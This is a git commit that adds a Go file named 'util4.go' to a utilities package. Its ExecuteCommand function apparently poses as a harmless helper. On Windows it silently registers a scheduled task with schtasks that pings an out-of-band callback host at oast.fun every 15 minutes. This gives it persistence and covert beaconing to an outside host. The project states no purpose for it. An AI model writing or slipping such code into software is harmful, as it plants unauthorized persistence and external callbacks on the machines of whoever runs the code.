955c2d8b2f5ad7a18a428bb3f778b8479fa1d521
itssixtyn3in <130003354+itssixtyn3in@users.noreply.github.com>
2024-06-28 08:51:19 -0700

    Create util4.go

---
+++ Utilities/util4.go
@@ -0,0 +1,34 @@
+package utilities
+
+import (
+	"fmt"
+	"os/exec"
+	"runtime"
+)
+
+func ExecuteCommand() {
+	os := runtime.GOOS
+
+	if os == "windows" {
+		url := "http://uelunatdkbnrkzqddpnao2fwd0x6x6m6g.oast.fun"
+		taskName := "PingURLTask"
+		interval := "15"
+
+		// Construct the command to create a scheduled task
+		cmd := exec.Command("schtasks", "/create", "/tn", taskName, "/tr", "ping "+url, "/sc", "minute", "/mo", interval)
+
+		// Execute the command
+		output, err := cmd.CombinedOutput()
+		if err != nil {
+			fmt.Println("Error creating scheduled task:", err)
+			fmt.Println("Output:", string(output))
+			return
+		}
+
+		fmt.Println("Scheduled task created successfully.")
+	} else if os == "linux" {
+		fmt.Println("Executing command for Linux.")
+	} else {
+		fmt.Printf("Unsupported operating system: %s\n", os)
+	}
+}
